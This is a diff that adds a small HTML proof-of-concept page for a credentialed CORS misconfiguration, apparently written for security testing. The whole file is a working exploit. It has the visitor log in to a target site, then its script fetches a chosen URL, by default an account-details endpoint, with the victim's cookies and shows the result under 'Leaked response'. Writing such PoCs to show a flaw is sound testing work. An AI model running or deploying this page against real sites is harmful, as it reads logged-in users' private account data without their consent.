@@ -1,0 +1,29 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>CORS Credentialed PoC</title>
+<style>body{font:14px/1.4 system-ui;margin:24px} pre{white-space:pre-wrap;background:#111;color:#0f0;padding:12px}</style>
+<h1>CORS PoC</h1>
+<ol>
+  <li>Log in to the target in another tab.</li>
+  <li>Return here and click “Run”.</li>
+</ol>
+<p>
+  Target URL: <input id="u" size="80" value="https://target.example.com/accountDetails">
+  <button id="run">Run</button>
+</p>
+<div id="out"></div>
+<script>
+function esc(s){return s.replace(/[&<>]/g,m=>({ '&':'&amp;','<':'&lt;','>':'&gt;' }[m]))}
+document.getElementById('run').onclick = async ()=>{
+  const url = document.getElementById('u').value.trim();
+  const out = document.getElementById('out');
+  out.innerHTML = '<p>Fetching…</p>';
+  try {
+    const r = await fetch(url, { credentials: 'include', mode: 'cors' });
+    const txt = await r.text();
+    out.innerHTML = '<h2>Leaked response</h2><pre>'+esc(txt)+'</pre>';
+  } catch (e) {
+    out.textContent = 'Error: ' + e;
+  }
+};
+</script>
